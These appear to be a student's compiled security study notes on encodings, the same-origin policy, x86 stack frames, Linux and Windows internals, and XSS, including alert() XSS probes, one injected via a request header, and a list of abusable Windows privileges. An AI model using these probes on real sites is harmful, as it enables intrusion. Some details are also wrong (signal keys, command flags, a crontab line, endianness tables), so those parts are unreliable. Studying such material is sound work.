    Internet users, via their web browsers, request billions of pages every day. All of the content of these pages are displayed according to a charset. But what is a character set? It contains a set of characters: they represent the set of all symbols(What the user reads as he sees it on the screen) and code points(Numeric index, used to distinguish, unambiguosly, the symbol within the charset) that the end user can display in their browser window. //A symbol can be shown only if it exists in the charset. Examples of charsets are: ASCII(https://www.ascii-code.com/), Unicode(https://unicode-table.com/en/#0032)/UTF-8, UTF-16 and UTF-32(The numbers are the amount of bits used to represent code points), Latin-1 and so on

    HTML4 ==> <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"> //ISO-8859-1: "8-bit single-byte coded graphic character sets" aka Latin 1
    HTML5 ==> <meta charset="UTF-8">
    
    If you want to show symbols (like < > ) in your web document and you want to avoid the symbols being interpreted by your browser as HTML language elements, then you need to use the related entities(It is not a really security feature however, its use can limit most client side attacks. An HTML entity is simply a string (starting with & or &# and ending with ;) that corresponds with a symbol. When the browser encounters an entity in an HTML page it will show the symbol to the user and will not ever interpret the symbol as an HTML language element
    Character Reference       Rule                                            Encoded character
    Named entity              & + named character references + ;              &lt; 
    Numeric Decimal           & + # + D + ;                                   &#60;
                                D = a decimal number
    Numeric Hexadecimal       & + #x + H + ;                                  &#x3c;
                                H = an hexadecimal number (case-insensitive)  &#X3C;

    URL encoding(percent encoding)
      URLs sent over the Internet must contain characters in the range of the US-ASCII code character set. If unsafe characters are present in a URL, encoding theme is required. 
      This encoding is important because it limits the characters to be used in a URL to a subset of specific characters:
        1. Unreserver chars: [a-zA-Z] [0-9] [-._~]
        2. Reserved chars (they have a specific purpose): :/?#[]@!$&"()*+,;=%·
      Other characters are encoded by the use of a percent char (%) plus two hexadecimal digits. Reserved chars must be encoded when they have no special role inside the URL. A list of common encoded characters(https://www.w3schools.com/tags/ref_urlencode.asp)
        Character   Purpose in URI          Encoding
        #           Separate anchors        %23
        ?           Separate query string   %3F
        &           Separate query elements %26
        +           Indicates a space       %2B

    Base64 
      Is a binary-to-text encoding schema used to convert binary files and send them over Internet. For example, the e-mail protocol makes massive use of this encoding to attach files to messages. The HTML language permits the inclusion of some resources by using this encoding. For example, an image can be included in a page by inserting its binary content that has been converted to base64
      The alphabet of the Base64 encoding scheme is composed of:
        digits ==> [0-9]
        latin letters ==> [a-zA-Z] 
        + and /

  Same Origin Policy(SOP)
    This policy prevents a script or a document from getting or setting properties of another document that comes from a different origin. The primary purpose of SOP is to isolate requests coming from different origins.
    The main rule of SOP is:
      "A document(HTML page, an iframe included in the main page or a response to an Ajax request) can access (through JavaScript) the properties of another document only if they have the same origin" //More precisely, the browser always performs the request successfully but it returns the response to the user only if the SOP is respected.
    CSS stylesheets(*.css), images and scripts(*.js) are loaded by the browser without consulting the policy. SOP is consulted when cross-site HTTP requests are inititated from within client side scripts (IE: JavaScript), or when an Ajax request is run.
    The origin is defined by the following triplet:
      Protocol + Host + Port ==> http://www.elswapt.site
    Other example ==> http://els.wapt.site/index.php
      SOP OK ==> http://els.wapt.site/admin/index.php ==> Same protocol, host and port
      SOP not OK ==>  https://els.wapt.site/index.php ==> Different protocol
    Content from ... inherits the origin
      about:blank
      javascript:
      data: 
    !Internet explorer works a bit differently from other browsers. It has two exceptions:
      · Port: It does not consider the port as a Same Origin component
      · Trust zone: The same Origin is not applied to domains that are in highly trusted zone (i.e. corporate domains)
    What would it happen if SOP did not exist?

      Suppose you are logged in to your bank site and suppose your friend invites you to visit his new website. Your evil friend could build a crafted page, instigate you to visit it and once visited by you, access(some) personal information from your bank account
    Example 
      Let us suppose that index.html on domain a.elswapt.site (referred to as origin1: http://a.elswapt.site) wants to access via an Ajax request(hxr) the home.html page on domain b.elswapt.site (referred to as origin2: http://b.elswapt.site). 
      The document index.html on domain a.elswapt.site cannot access via an Ajax request (xhr) the home.html page on domain b.elswapt.site

Architecture fundamentals
CPU, ISA and Assembly
 	> CPU (Central Process Unit): Is the device in charge of executing the machine code of a program
 	> Machine code (= machine language): Set of instructions that the CPU processes. Each instruction is a primitive command that executes a specific operation such as move data, changes the execution flow of the program, perform arithmetic or logic operations and others. CPU instructions are represented in hexadecimal. Therefore, the same machine code gets translated into mnemonic code (a more readable language); this is called the assembly language (ASM). The assembler we are going to use is NASM
 	> Each CPU has its own instruction set architecture (ISA) that a programmer (or a compiler) must understand and use to write a program correctly for that specific CPU and machine. One of the most common ISA is the x86 instruction set from the Intel 8086. The x86 acronym identifies 32-bit processors, while x64(aka x86_64 or AMD64) identifies the 64-bit versions. 

Registers
	> The number of bits, 32 or 64, refers to the width of the CPU registers. Each CPU has its fixed set of registers that are accessed when required. You can think of registers as temporary variables used by the CPU to get and store data.
	> Although almost all registers are small portions of memory in the CPU and serve to store data temporarily, it is important to know that some of them have specific functions, while some others are used for general data storage. We will focus on a specific group of registers: The General Purpose Registers (GPRs)
	> 8 general purpose registers to the x86 architecture
	EAX => Accumulator 	==> Used in arithmetic operation
	ECX => Counter 		==> Used in shift/rotate instruction and loops
	EDX => Data 		==> Used in arithmetic operation and I/0
	EBX => Base		==> Used as a pointer to data
	ESP => Stack Pointer	==> Pointer to the top of the stack
	EBP => Base Pointer 	==> Pointer to the base of the stack (aka Stack Base Pointer or Frame pointer)
	ESI => Source Index	==> Used as a pointer to a source in stream operation
	EDI => Destination 	==> Used as a pointer to a destination in stream operation
	> The naming convention of the old 8-bit CPU had 16-bit register divided into two parts:
		- A low byte, identified by an L at the end of the name 
		- A high byte, identified by an H a the end of the name
		For example: AH|AL, CH|CL, DH|DL, BH|BL, SPL, BPL, SIL and DIL
	> The 16-bit naming convention combines the L and the H and replaces it with an X. While for Stack Pointer, Base Pointer, Source and Destination registers it simply removes the L
		For example: AX, CX, DX, BX, SP, BP, SI and DI
	> In the 32-bit representation, the register acronym is prefixed with an E, meaning extended
	> In the 64-bit representation, the E is replaced with the R
	> Another important register , the EIP (x86 naming convention). It controls the program execution by storing a pointer to the address of the next instruction (machine code) that will be executed. It tells the CPU where the next instruction is.

Process Memory
The process is divided into four regions: Text, Data, the Heap and the Stack
	> The Text region, or instruction segment, is fixed by the program and contains the program code (instructions). This region is marked as read-only since the program should not change during execution
	> The Data region is divided into initialized data and uninitialized data. Initialized data includes items such as static and global declared variables that are pre-defined and can be modified. 
		+ The unintialized data, named Block Started by Symbol(BSS) also initializes variables thata are initialized to zero or do not have explicit initialization(ex. static int t)
	> Next is the Heap, which starts right after the BSS segment. During the execution, the program can request more space in memory via 'brk' and 'sbrk' system calls, used by 'malloc', 'realloc' and 'free'. Hence, the size of the data region can be extended.
	> The last region of the memory is the Stack.

The Stack
· The Stack is a Last-in-First-out (LIFO) block of memory. It is located in the higher part of the memory. You can think of the stack as an array used for saving a function's return addresses, passing function arguments and storing variables. The purpose of the ESP register(Stack Pointer) is to identify the top of the stack and it is modified each time a value is pushed in (PUSH) or popped out (POP)
· The stack grows downwards, towards the lower memory addresses
· The Heap would start from lower addresses and grow upwards and the Stack would start from the end of the memory and grow downward.
· The first example of how the stack changes is the execution of the following instruction: PUSH E
· The second example is the execution of the following instruction: POP E
	PUSH Instruction
	· A PUSH instruction subtracts 4(in 32-bit) or 8(in 64-bit) from the ESP and writes the data to the memory address in the ESP and then updates the ESP to the top of the stack. Remember that the Stack grows backward. Therefore the PUSH subtracts 4 or 8 in order to point to a lower memory location on the stack. If we do not subtract it, the PUSH operation will overwrite the current location pointed by ESP (the top) and we would lose data.
	> The ESP points to the top of the stack -4
		ESP	A	==> PUSH (E) ==>	E 	ESP-4
			B				A
			C				B
			D				C
							D
	> A more detailed example of the PUSH instruction
 		+ Starting value (ESP contains the address value): ESP points to the following memory address: 0x0028FF80
		+ Process: The program executes the instruction PUSH 1. ESP decreases by 4, becoming 0x0028FF7C and the value 1 will be pushed on the stack
				      ...	==> PUSH 1 ==>	ESP = 0x0028FF7C ==> 00000001
		ESP = 0x0028FF80 => ..data..					     ..data..
				    ..data..					     ..data..
				    ..data..					     ..data..
	POP Instruction
	 POP PROCESS
	 · A POP is executed and the ESP register is modified
	 STARTING VALUE
	 · The ESP points to the top of the stack (Previous ESP +4)
	 PROCESS
	 · The POP operation is the opposite of PUSH and it retrieves data from the top of the Stack. Therefore, the data contained at the address location in ESP (the top of the stack) is retrieved and stored (usually in another register). After a POP operation, the ESP value is incremented in x86 by 4 or in x64 by 8.
	ENDING VALUE
 	> The ESP points to the top of the stack +4. (Same as the previous location before the PUSH)
 		ESP	E	==> POP (E) ==>		A 	ESP+4
 			A				B
 			B				C
 			C				D
 			D       			

	> A more detailed example of the POP instruction
 		+ Starting value (ESP contains the address value): After the PUSH 1 the ESP points to the following memory address: 0x0028FF7C
		+ Process: The program executes the instruction POP EAX. The value (00000001) contained at the address of the ESP (0x0028FF7C = the top of the Stack) will be popped out from the stack and will be copied in the EAX register. Then, ESP is updated by adding 4 and becoming 0x0028FF80.

										     00000001
		ESP = 0x0028FF7C => 00000001	==> POP EAX ==>	ESP = 0x0028FF80 ==> ..data.. 
		 	            ..data..					     ..data..
				    ..data..					     ..data..
				    ..data..
	Procedures and functions
	 > It is important to understand thtat the value popped from the stack is not deleted (or zeroed). It will stay in the stack until another instruction overwrites it.

· Now that we know more about the Stack, we will investigate how procedures and functions work. It is important to know that procedures and functions alter the normal flow of the process. When a procedure or a function terminates, it returns control to the statement or instruction that called the function.	

· Stack Frames
 > Functions contain two important components
  - Prologue: Prepares the stack to be used 
  - Epilogue: When the function has completed, the epilogue resets the stack to the prologue settings.
 > The Stack consists of logical stack frames (portions/areas of the Stack) that are PUSHed when calling a functions and POPped when returning a value.
 > When a subroutine, such as a function or procedure, is started, a stack frame is created and assigned to the current ESP location (top of the stack); this allows the subroutine to operate independently in its own location in the stack.
 > When the subroutine ends, 2 things happen:
  1. The program receives the parameters passed from the subroutine.
  2. The Instruction Pointer (EIP) is reset to the location at the time of the initial call.
  * In other words, the stack frame keeps track of the location where each subroutine should return the control when it terminates.
 > This process has tree main operations:
  1. When a function is called, the arguments [(in brackets)] need to be evaluated
  2. The control flow jumps to the body of the function and the program executes its code
  3. Once the function ends, a return statement is encountered, the program returns to the function call (the next statement in the code).
  # Example in C
  int b(){ //function b
          return 0;
  }
  int a(){ //function a
          b();
          return 0;
  }
  int main(){ //main function
          a();
          return 0;
  }
  ## Explanation
  #Higher memory address(To upwards)Lower memory address.
  · Step 1:
  	+ The entry point of the program is main()
	+ The first stack frame that needs to be pushed to the Stack is the main() stack frame. Once initialized, the stack pointer is set to the top of the stack and a new main() stack frame is created.
  · Step 2:
  	+ Once inside main(), the first instruction that executes is a call to the function named a(). Once again, the stack pointer is set to the top of the stack of main() and a new stack frame for a () is created on the stack.
  · Step 3:
  	+ Once the function a() starts, the first instruction is a call to the function named b(). Here again, the stack pointer is set and a new stack frame for b() will be pushed on the top of the stack.
  · Step 4:
  	+ The function b() does nothing and just returns. When the function completes, the stack pointer is moved to its previous location and the program returns to the stack frame of a() and continues with the next instruction.
  · Step 5:
  	+ The next instruction executed is the return statement contained in a(). The a() stack frame is popped, the stack pointer is reset and we will get back in the main() stack frame.
  ## Another example related with Buffer Overflow.
  void functest(int a, int b, int c)  {
          int test1 = 55;
          int test2 = 56;
  }
  int main(int argc, char * argv[]) {
          int x = 11;
          int z = 12;
          int y = 13;
          functest(30,31,32);
          return 0;
  }
  ##Explanation
  · Step 1:
  	+ When the program starts, the function main() parameters (argc, argv) will be pushed on the stack from right to left. 
		argc
		argv
		...
  · Step 2:	
	+ CALL the function main(). Then, the processor PUSHes the content of the EIP(Instruction Pointer) to the stack and points to the first byte after the CALL instruction.
	+ This process is important because we need to know the address of the next instruction in order to proceed when we return from the function called.
  · Step 3:
  	+ The caller (the instruction that executes the function calls - the OS in this case) loses its control and the calle (the function that is called - the main function) takes control.
		old EIP  //Return address from main(). The next instruction to execute once we return from main.
		argc
		argv
		...
  · Step 4:
  	+ Now that we are in the main() function, a new stack frame needs to be created. The stack frame is defined by the EBP (Base Pointer) and the ESP (Stack pointer). Because we don't want to lose the old stack frame information, we have to save the current EBP on the Stack. If we did not do tis, when we returned, we will not know that this information belonged to the previous stack frame, the function that called main(). Once its value is stored , the EBP is updated and it points to the top of the stack
		old EBP //Contains the base pointer of the caller. At this time, both EBP and ESP points at the 
		old EIP   |
		argc	  |	Old stack frame
		argv      |
		...       | 
 · Prologue
 	It is a sequence of instructions that take place at the beginning of a function. This will occur for all functions. Once the callee gets the control, it will execute the following instructions:
	1 push ebp
	2 mov ebp, esp
	3 sub esp, X // X is a number
	
	##Explanation
	The first instruction(push ebp) saves the old base pointer onto the stack,so it can be restored later on when the function returns.
	EBP is currently pointing to the location of the top of the previous stack frame.
	----
	The second instruction (mov ebp, esp) copies the value of the Stack pointer (ESP - top of the stack) into the base pointer (EBP); this creates a new stack frame on top of the Stack.
	 + The base of the new stack frame is on top of the old stack frame
	 + Important: Notice that in assembly, the second operand of the instruction (esp in this case) is the source, while the first operand (ebp in this case) is the destination. Hence, esp is moved into ebp.
		
	The last instruction (sub esp, X) moves the Stack Pointer (top of the stack) by decreasing its value, this is necessary to make space for the local variables.
	 + Similar to the previous instruction, X is the source and esp is the destination. Therefore, the instruction subtracts X from esp (this X is not the int variable X from the program)
	 + The third instruction creates enough space in the stack to copy local variables. Variables are allocated by decreasing the stack pointer (top of the stack) by the amount of space required.
	 + Remember that the stack grows backward. Therefore, we have to decrease its value to expand the stack frame
	
	 + This represents the Stack once the prologue has happened.
	   Lower memory address					     <= [ESP-X]
	   	To			...
	   	[Upward]		EBP-8
	   	From			EBP-4	
	   Higher memory address	EBP+0	old EBP (caller EBP) <= EBP
	   				EBP+4	old EIP
	   				EBP+8	argc	
	   				...	argv
	   					...
	 	=> Notice that since the main function contains other variables and a function call, the actual stack frame for the main() subroutine is slightly bigger.
	 + Once the prologue ends, the stack frame for main() is complete and the local variables are copied to the stack. Since ESP is not pointing to the memory address right after EBP, we cannot use the PUSH operation, since PUSH stores the value on top of the stack (the addresss pointed by ESP).
	 + The variable is a hexadecimal value that is an offset from the base pointer (EBP) or the stack pointer (ESP)
	 + The instructions after the prologue are like the following:
	 	MOV DWORD PTR SS:[ESP+Y],0B
		> This instruction means: move the value 0B (hexadecimal of 11 - the first local variable) into the memory address location pointed at ESP+Y. Note that Y is a number and ESP+Y points to a memory address between EBP and ESP.
	 + This process will repeat through all the variables and once the process completes, the stack will look like the following

	   Lower memory address					     <= ESP
	   	To			...	13 (y)
	   	[Upward]		EBP-8	12 (z)
	   	From			EBP-4	11 (x)		     <= [ESP+Y]
	   Higher memory address	EBP+0	old EBP (caller EBP) <= EBP
	   				EBP+4	old EIP
	   				EBP+8	argc	
	   				...	argv
	   					...
	 + Then the main() continues executing its instructions.

  · Step 5
  	+ The next instruction calls the function functest().
	+ The whole process will be executed again. This time a new stack frame will be created for the function functest().
	The process looks like the following:
		> PUSH the function parameters in the stack
		> Call the function functest()
		> Execute the prologue (which will update EBP and ESP to create the new stack frame)
		> Allocate local variables onto the stack.
	+ The following is how the stack looks like at the end of the entire process.
		Functest Stack Frame	56		<- ESP
					55
					Old EBP (main)  <- EBP
		Main Stack Frame	old EIP
					30
					31
					32
					...
					13(y)
					12(z)
					11(x)
					old EBP
		OS Stack Frame		old EIP
					argc 
					argv
					...

1.2.4.6 Epilogue
 + We have seen how the stack frames are created. Now, we have to understand how they are destroyed. What happens when the code executes a return statement and the control goes back to the previous procedure (and stack frame)?
 + When the program enters a function, the prologue is executed to create the new stack frame
 + When the program executes a return statement, the previous stack frame is restored thanks to the epilogue.
 + The operations executed by the epilogue are the following:
 	 · Return the control to the caller
	 · Replace the stack pointer with the current base pointer. It restores its value to before the prologue; this is done by POPping the base pointer from the stack.
	 · Returns to the caller by POPping the instruction pointer from the stack (stored in the stack) and then it jumps to it.
 + The following code represents the epilogue:
 	leave 
	ret
 + The instructions can also be written as follows:
 	mov esp, ebp
	pop ebp
	ret
 + This is what happens to the previous stack when the function functest() ends. Notice that even if the code does not contain a return, when the program leaves a subroutine it will still run the epilogue.
					...
		Main Stack Frame ESP ->	Old EBP (main)  <- EBP
					old EIP
					30
					31
					32
					...
					13(y)
					12(z)
					11(x)
					old EBP
		OS Stack Frame		old EIP
					argc 
					argv
					...
 + The first instruction in the epilogue is mov esp, ebp. After it gets executed; both ESP and EBP point to the same location.
 + The next instruction is pop ebp, which simply POPS the value from the top of the stack into EBP. Since the top of the Stack points to the memory address location where the old EBP is stored (the EBP of the caller), the caller stack frame is restored.
 + It is important to know that a POP operation automatically updates the ESP (same as the PUSH).
 + Therefore, ESP now points to the old EIP previously stored
					...
					Old EBP (main)  
		Main Stack Frame	old EIP		<- ESP
					30
					31
					32
					...
					13(y)
					12(z)
					11(x)
					old EBP 	<- EBP
		OS Stack Frame		old EIP
					argc 
					argv
					...
 + The last instruction that the epilogue will execute is ret. RET pops the value contained at the top of the stack to the old EIP - the next instruction after the caller and jumps to that location. This gives control back to the caller. RET affects only the EIP and the ESP registers.

1.2.5 Endianness
 + Endianness is the way of representing (storing) values in memory.
 + Even though there are three types of endianness, we will explain only two of them, the most important ones: big-endian and little-endian.
 > First, it is important to know these two concepts:
 	· The most significant bit (MSB) in a binary number is the largest value, usually the first from the left. So, for example, considering the binary number 100 the MSB is 1.
	· The least significant bit (LSB) in a binary number is the lowest value, usually the first from the right. So, for example, considering the binary number 110 the LSB is 0.
 + In the big-endian representation, the least significant byte (LSB) is stored at the highest memory address. While the most significant byte (MSB) is at the lowest memory address.
 	· Example: the 0x12345678 value is represented as:
		Highest memory	Address in memory	Byte value
				+0			0x12
				+1			0x34
				+2			0x56
		Lowest memory	+3			0x78
 + Respectively, in the little-endian representation, the least significant byte (LSB) is stored at the lower memory address, while the most significant byte is at the highest memory address. 
 	· Example: the 0x12345678 is represented in memory as:
		Highest memory	Address in memory	Byte value
				+0			0x78
				+1			0x56
				+2			0x34
		Lowest memory	+3			0x12
 + Here's another example. Let us consider the value 11 (0B in hexadecimal). The example system is using little-endian representation; therefore, the LSB is stored in the lower memory address or MSB is stored at the highest memory address.
 + Using the previous table, we will have the following
		Highest memory	Address in memory	Byte value
				+0			0x0B
				+1			0x00
				+2			0x00
		Lowest memory	+3			0x00
 + Remember that the most significant byte is stored at the highest memory address and since the stack grows backward (towards lower addresses), the most significant byte (0B in this case) will be stored on the "left" (0028FEBF - the highest memory address)

1.2.6 NOPs
+ Another important topic is the No Operation instruction (NOP)
+ NOP is an assembly language instruction that does nothing. When the program encounters a NOP, it will simply skip to the next instruction. In Intel x86 CPUs, NOP instructions are represented with the hexadecimal value 0x90
+ NOP-sled is a technique used during the exploitation process of Buffer Overflows. Its only purpose is to fill a large (or small) portion of the stack with NOPs; this will allow us to slide down to the instruction we want to execute, which is usually put after the NOP-sled.
+ The reason is because Buffer Overflows have to match a specific size and location that the program is expecting.

    Most Linux distributions have now switched to systemd. This daemon is an Init process started first and thus has the process ID (PID) 1. This daemon monitors and takes care of the orderly starting and stopping of other services. All processes have an assigned PID that can be viewed under /proc/ with the corresponding number. Such a process can have a parent process ID (PPID), known as the child process.
    Besides systemctl we can also use update-rc.d to manage SysV init script links. Let us have a look at some examples
        systemctl enable ssh
    systemctl list-units --type=service //list all services

    3	SIGQUIT - Sent when a user presses [Ctrl] + D to quit.
    9	SIGKILL - Immediately kill a process with no clean-up operations.
    15	SIGTERM - Program termination.
    19	SIGSTOP - Stop the program. It cannot be handled anymore.
    20	SIGTSTP - Sent when a user presses [Ctrl] + Z to request for a service to suspend and they will not be executed further. To keep it running in the background, we have to enter the command bg to put the process in the background.

| `updatedb` | Updates the locale database for existing contents on the system. |
| `locate` | Uses the locale database to find contents on the system. | 
| `more` | Pager that is used to read STDOUT or files. |

Path	Description
/	    The top-level directory is the root filesystem and contains all of the files required to boot the operating system before other filesystems are mounted as well as the files required to boot the other filesystems. After boot, all of the other filesystems are mounted at standard mount points as subdirectories of the root.
/bin	Contains essential command binaries.
/boot	Consists of the static bootloader, kernel executable, and files required to boot the Linux OS.
/dev	Contains device files to facilitate access to every hardware device attached to the system.
/etc	Local system configuration files. Configuration files for installed applications may be saved here as well.
/home	Each user on the system has a subdirectory here for storage.
/lib	Shared library files that are required for system boot.
/media	External removable media devices such as USB drives are mounted here.
/mnt	Temporary mount point for regular filesystems.
/opt	Optional files such as third-party tools can be saved here.
/root	The home directory for the root user.
/sbin	This directory contains executables used for system administration (binary system files).
/tmp	The operating system and many programs use this directory to store temporary files. This directory is generally cleared upon system boot and may be deleted at other times without any warning.
/usr	Contains executables, libraries, man files, etc.
/var	This directory contains variable data files such as log files, email in-boxes, web application related files, cron files, and more.

Working with Web Services
 For an Apache web server, we can use appropriate modules, which can encrypt the communication between browser and web server (mod_ssl), use as a proxy server (mod_proxy), or perform complex manipulations of HTTP header data (mod_headers) and URLs (mod_rewrite).

Navigation
  cd - //Jump back to the directory we were last in

Redirect STDIN Stream to a File
  We can also use the double lower-than characters (<<) to add our standard input through a stream. We can use the so-called End-Of-File (EOF) function of a Linux system file, which defines the input's end
  cat << EOF > stream.txt

An option for further locking down Linux systems is Security-Enhanced Linux (SELinux) or AppArmor. This is a kernel security module that can be used for security access control policies. In SELinux, every process, file, directory, and system object is given a label. Policy rules are created to control access between these labeled processes and objects and are enforced by the kernel. This means that access can be set up to control which users and applications can access which resources. SELinux provides very granular access controls, such as specifying who can append to a file or move it. Besides, there are different applications and services such as Snort, chkrootkit, rkhunter, Lynis, and others that can contribute to Linux's security.

	-type d(only find directories) || f(find files)
	-name || -iname: Case insensitive
	-user: The username of the owner of a file
	-size: -n/+n/n can be used, where n is a number. To specify a size, you also need a sufix. c=bytes, k=KB and M=MBs. Example: If you want to specify a size less than 30 bytes, the argument -30c should be used
	-perm: To specify permissions.
		You can use - prefix to return files with at least the permissions you specify. This means that the -444 mode will match files that are readable by everyone, even if someone also has write and/or execute permissions.
		Using the / prefix will return files that match any of the permissions you have set. This means that the /666 mode will match files that are readable and writeable by at least one of the groups(owner,group or others)
	-a,m,c with min(for minutes) and time(days).

wget: Allows us to download files from the web via HTTP--as if you were accessing the file in your browser
SCP: Unlike the regular cp command, this command allows you to transfer files between two computers using the SSH protocol to provide both authentication and encryption
	To copy an example file from our machine to a remote machine	scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt
	To copy a file from a remote computer that we are not logged into:	scp ubuntu@192.168.1.30:/home/ubuntu/documents.txt notes.txt
python3 -m http.server: One flaw with this module is that you have no way of indexing, so you must know the exact name and location of the file that you wish to use.
	And alternative is updog(pip3 install updog)
Viewing processes:
	ps aux: To see the processes run by other users and those that don't run from a session(i.e. system processes)
	top
	kill: Below are some of the signals that we can send to a process when it is killed
		SIGTERM: Kill the process, but allow it to do some cleanup tasks beforehand
		SIGKILL: Kill the process - doesn't do any cleanup after the fact
		SIGSTOP: Stop/suspend a process
	Once a system boots and it initialises, systemd is one of the first processes that are started. Any program or piece of software that we want to start will start as what's known as a child process of systemd. This means that it is controlled by systemd, but will run as its own process(although sharing the resources from systemd) to make it easier for us to identify and the likes.
	We can do four options with systemctl(This command allows us to interact with the systemd process/daemon)
		Start
		Stop
		Enable
		Disable
	When excuting things like scripts --rather than relying on the & operator, we can use ctrl + z on our keyboard to background a process.
	fg: To bring the background process back into use on the terminal, where the output of the script is now returned to use

crontabs: One of the processes that is started during boot, which is responsible for facilitating and managing cron jobs. It is simply a special file with formatting that is recognised by the cron. It requires 6 specific values:
	MIN: What minute to execute at
	HOUR: What hour to execute at
	DOM: What day of the month to execute at
	MON: What month of the year to execute at
	DOW: What day of the week to execute at
	CMD: The actual command that will be executed

	Example: 0 *12 * * * cp -R /home/andres/Documents /var/backups/
	crontab -e: Crontabs can be edited

package management:
	add-apt-repository. Whilst you can install software through the use of package installers such as dpkg. The benefits os apt means that whenever we update our system, the repository that contains the pieces of software that we add also gets checked for updates
	When adding software, the integrity of what we download is guaranteed by the use of what is called GPG(Gnu Privacy Guard) keys.
	Example:
		wget -qo - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -
		A good practice is to have a separate file for every different community/3rd party repository that we add
			in /etc/apt/sources.list.d touch sublime-text.list
			nano sublime-text.list
			deb https://download.sublimetext.com/ apt/stable/
		apt update: After that, we need to update apt to recognise this new entry
		apt install sublime-text
		add-apt-repository --remove  and after apt remove sublime-text: To remove packages

    Core windows processes
        Tools better than taskmgr.exe: Process hacker and process explorer
        The first Windows process on the list is System. It was mentioned in a previous section that a PID for any given process is assigned at random, but that is not the case for the System process. The PID for System is always 4.
            What is unusual behavior for this process?
                A parent process (aside from System Idle Process (0))
                Multiple instances of System. (Should only be 1 instance)
                A different PID. (Remember that the PID will always be PID 4)
                Not running in Session 0
            The next process is smss.exe (Session Manager Subsystem). This process, also known as the Windows Session Manager, is responsible for creating new sessions. This is the first user-mode process started by the kernel.

            This process starts the kernel mode and user mode of the Windows subsystem (you can read more about the NT Architecture here). This subsystem includes win32k.sys (kernel mode), winsrv.dll (user mode), and csrss.exe (user mode).

            Smss.exe starts csrss.exe (Windows subsystem) and wininit.exe in Session 0, an isolated Windows session for the operating system, and csrss.exe and winlogon.exe for Session 1, which is the user session. The first child instance creates child instances in new sessions. This is done by smss.exe copying itself into the new session and self-terminating.
            What is unusual?

                A different parent process other than System(4)
                Image path is different from C:\Windows\System32
                More than 1 running process. (children self-terminate and exit after each new session)
                User is not SYSTEM
                Unexpected registry entries for Subsystem

            As mentioned in the previous section, csrss.exe (Client Server Runtime Process) is the user-mode side of the Windows subsystem. This process is always running and is critical to system operation. If by chance this process is terminated it will result in system failure. This process is responsible for the Win32 console window and process thread creation and deletion. For each instance csrsrv.dll, basesrv.dll, and winsrv.dll are loaded (along with others).

            This process is also responsible for making the Windows API available to other processes, mapping drive letters, and handling the Windows shutdown process.

            What is unusual?

                An actual parent process. (smss.exe calls this process and self-terminates)
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process masquerading as csrss.exe in plain sight
                User is not SYSTEM

            The Windows Initialization Process, wininit.exe, is responsible for launching services.exe (Service Control Manager), lsass.exe (Local Security Authority), and lsaiso.exe within Session 0. This is another critical Windows process that runs in the background, along with its child processes.


            Note: lsaiso.exe is a process associated with Credential Guard and Key Guard. You will only see this process if Credential Guard is enabled.
            What is unusual?

                An actual parent process. (smss.exe calls this process and self-terminates)
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                Multiple running instances
                Not running as SYSTEM

            The next process is the Service Control Manager (SCM), which is services.exe. Its primary responsibility is to handle system services: loading services, interacting with services, starting/ending services, etc. It maintains a database that can be queried using a Windows built-in utility, 'sc.exe.'


            Information regarding services is stored in the registry, HKLM\System\CurrentControlSet\Services.

            What is unusual?

                A parent process other than wininit.exe
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                Multiple running instances
                Not running as SYSTEM

            The Service Host (Host Process for Windows Services), or svchost.exe, is responsible for hosting and managing Windows services

            What is unusual?

                A parent process other than services.exe
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                The absence of the -k parameter


            "Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens. It also writes to the Windows Security Log."
            There are two types of access tokens:

              primary access tokens: those associated with a user account that are generated on log on
              impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

          For an impersonation token, there are different levels:

              SecurityAnonymous: current user/client cannot impersonate another user/client
              SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
              SecurityImpersonation: current user/client can impersonate the client's security context on the local system
              SecurityDelegation: current user/client can impersonate the client's security context on a remote system

          where the security context is a data structure that contains users' relevant security information.

          The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

              SeImpersonatePrivilege
              SeAssignPrimaryPrivilege
              SeTcbPrivilege
              SeBackupPrivilege
              SeRestorePrivilege
              SeCreateTokenPrivilege
              SeLoadDriverPrivilege
              SeTakeOwnershipPrivilege
              SeDebugPrivilege

            It creates security tokens for SAM (Security Account Manager), AD (Active Directory), and NETLOGON. It uses authentication packages specified in HKLM\System\CurrentControlSet\Control\Lsa.

            The Windows Logon, winlogon.exe, is responsible for handling the Secure Attention Sequence (SAS). This is the ALT+CTRL+DELETE key combination users press to enter their username & password.

            It is also responsible for locking the screen and running the user's screensaver, among other functions.

            What is unusual?

                An actual parent process. (smss.exe calls this process and self-terminates)
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                Not running as SYSTEM
                Shell value in the registry other than explorer.exe

            The last process we'll look at is the Windows Explorer, explorer.exe. This is the process that gives the user access to their folders and files. It also provides functionality to other features such as the Start Menu, Taskbar, etc.

            As mentioned previously, the Winlogon process runs userinit.exe, which launches the value in HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell. Userinit.exe exits after spawning explorer.exe. Because of this, the parent process is non-existent.

            What is unusual?

                An actual parent process. (userinit.exe calls this process and exits)
                Image file path other than C:\Windows
                Running as an unknown user

    There are three major types of XSS attacks:
      DOM (Special)
              DOM XSS (Document Object Model-based Cross-site Scripting) uses the HTML environment to execute malicious javascript. This type of attack commonly uses the <script></script> HTML tag.
                <iframe src="javascript:alert(`xss`)">
      Persistent (Server-side)
              Persistent XSS is javascript that is run when the server loads the page containing it. These can occur when the server does not sanitise the user data when it is uploaded to a page. These are commonly found on blog posts. 
              Once request captured, add a new header like this. True-Client-IP: <iframe src="javascript:alert(`xss`)">
      Reflected (Client-side)
              Reflected XSS is javascript that is run on the client-side end of the web application. These are most commonly found when the server doesn't sanitise search data.



    To disable the browser built-in XSS protection
      Go to the URL bar, type about:config
      Search for browser.urlbar.filter.javascript
      Change the boolean value from True to False

